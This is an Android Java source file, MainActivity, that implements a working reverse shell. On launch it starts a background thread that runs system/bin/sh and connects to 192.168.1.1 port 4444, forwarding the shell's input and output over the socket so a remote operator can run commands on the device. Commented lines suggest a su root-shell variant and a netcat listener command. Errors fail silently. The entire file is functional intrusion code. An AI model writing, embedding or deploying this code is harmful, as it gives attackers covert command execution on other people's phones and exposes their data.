package com.example.androidreverseshell;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	TextView text;

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		text = new TextView(this);
		setContentView(text);
		text.setText("Reverse Shell");
		
		// start a reverse shell in the background
		new Thread(new Runnable(){
			@Override
			public void run() {
				try {
					reverseShell();
				} catch (Exception e) {
					Log.e("Reverse Shell Error", e.getMessage());
				}
			}
			
		}).start();
	}

	public void reverseShell() throws Exception {
		// could check to see if device is rooted
		// https://stackoverflow.com/questions/1101380/determine-if-running-on-a-rooted-device
		// final Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "system/bin/sh"}); // use if phone is rooted to get root shell...
		
		// create a process around the shell
		final Process process = Runtime.getRuntime().exec("system/bin/sh");

		// start a socket
		Socket socket = new Socket("192.168.1.1", 4444);
		
		// server should be listen on port 4444
		// Netcat Example: nc -l -p 4444

		// forward streams until socket closes
		forwardStream(socket.getInputStream(), process.getOutputStream());
		forwardStream(process.getInputStream(), socket.getOutputStream());
		forwardStream(process.getErrorStream(), socket.getOutputStream());
		process.waitFor();

		// close the socket streams
		socket.getInputStream().close();
		socket.getOutputStream().close();
	}
	
	
	private static void forwardStream(final InputStream input, final OutputStream output) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					final byte[] buf = new byte[4096];
					int length;
					while ((length = input.read(buf)) != -1) {
						if (output != null) {
							output.write(buf, 0, length);
							if (input.available() == 0) {
								output.flush();
							}
						}
					}
				} catch (Exception e) {
					// die silently
				} finally {
					try {
						input.close();
						output.close();
					} catch (IOException e) {
						// die silently
					}
				}
			}
		}).start();
	}

}
